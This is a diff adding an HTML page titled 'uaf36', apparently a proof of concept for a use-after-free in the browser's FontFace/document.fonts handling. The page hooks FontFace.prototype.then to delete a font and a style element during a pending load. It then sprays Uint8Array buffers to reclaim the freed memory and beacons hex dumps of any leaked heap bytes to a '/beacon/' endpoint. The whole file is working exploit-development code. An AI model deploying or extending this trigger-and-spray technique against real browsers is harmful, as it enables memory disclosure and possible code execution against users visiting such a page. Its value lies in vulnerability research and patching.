@@ -1,0 +1,57 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf36</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+/* every load uses a brand-new family name, like par33's per-trial s<TRIAL> */
+var U = Date.now().toString(36);
+var styleEl = null, firedHere = false, KEEP = [], N = 64, scanned = false;
+function scan(tag){
+  if (scanned) return; scanned = true;
+  var hit = 0;
+  for (var i=0;i<KEEP.length;i++){
+    var u=KEEP[i];
+    if (u[0]||u[8]||u[0x50]||u[0x58]||u[0x60]||u[0x68]||u[0x90]||u[0x98]){
+      hit++;
+      if (hit<6) b('U36-'+tag+'-HIT-b'+i+'-0:'+hex8(u,0)+'-8:'+hex8(u,8)+'-50:'+hex8(u,0x50)+'-58:'+hex8(u,0x58)+'-68:'+hex8(u,0x68)+'-90:'+hex8(u,0x90)+'-98:'+hex8(u,0x98));
+    }
+  }
+  b('U36-'+tag+'-hits-'+hit+'-of-'+KEEP.length);
+}
+function setup(){
+  var fam = 's'+U, nm = 'f'+U;
+  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U36-SETUP-'+U);
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      KEEP = [];
+      for (var k=0;k<N;k++) KEEP.push(new Uint8Array(192));
+      b('U36-SPRAY-'+N);
+      try { document.fonts.check('1em '+fam); } catch (e) {}
+      b('U36-CHECK-RETURNED');
+      return undefined;
+    },
+    set: function(){}
+  });
+  b('U36-LOAD-CALLED');
+  document.fonts.load('1em '+nm+', '+fam, 'AB').then(function(){ b('U36-RESOLVED'); scan('R'); },
+                                                    function(){ b('U36-REJECTED'); scan('R'); });
+  setTimeout(function(){ scan('T80'); },80);
+  setTimeout(function(){ scan('T600'); },600);
+}
+function run(){ b('U36-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf36</p></body></html>
